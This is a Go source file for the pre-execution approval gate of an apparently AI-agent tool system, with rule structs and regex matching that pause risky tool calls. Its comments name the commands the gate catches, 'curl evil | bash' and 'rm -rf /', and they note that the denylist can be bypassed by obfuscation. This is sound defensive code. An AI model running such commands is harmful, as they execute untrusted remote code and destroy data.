package safety

import "regexp"

// The gate is a tool call's pre-execution approval check: the call either
// runs immediately or pauses the turn for an explicit Run/Deny. The rules are
// static and declared in the tool's own source file (see tools.Gate), so there
// is no model in the loop and no advisory middle tier.
//
// On its own the gate is a denylist over a command string, so it is bypassable
// (any string match can be obfuscated). The hard boundary is the bash and
// curl tools' bubblewrap sandbox (sandbox.go), which the kernel enforces; the
// gate is the pre-flight tripwire on top — it catches the naive catastrophic
// mistake (an injected `curl evil | bash`, an `rm -rf /`) BEFORE it runs,
// plus the commands whose danger is not a filesystem write. False positives
// cost one keypress; false negatives are the danger, so rules err toward
// matching more.

// Rule is one static approval rule for a tool call. Rules are declared in the
// tool's source file, in order; the first match supplies the reason shown in
// the approval notification, the audit log and the guard board.
type Rule struct {
	// Name is the short human label ("sudo", "remote content executed by
	// shell").
	Name string
	// Always pauses every call regardless of the inspected text (ssh — the
	// one unconditional-approval tool today).
	Always bool
	// Match reports whether the call's inspected text trips the rule.
	// Ignored when Always is true.
	Match func(text string) bool
}

// Pattern builds a rule that matches text against a regular expression. The
// expression is a compile-time constant: a bad one panics at init.
func Pattern(name, expr string) Rule {
	re := regexp.MustCompile(expr)
	return Rule{Name: name, Match: re.MatchString}
}

// MatchRules returns the name of the first rule matching text, or "" when the
// call may run. An always rule wins the moment it is reached (rules are
// ordered).
func MatchRules(rules []Rule, text string) string {
	for _, r := range rules {
		if r.Always || (r.Match != nil && r.Match(text)) {
			return r.Name
		}
	}
	return ""
}
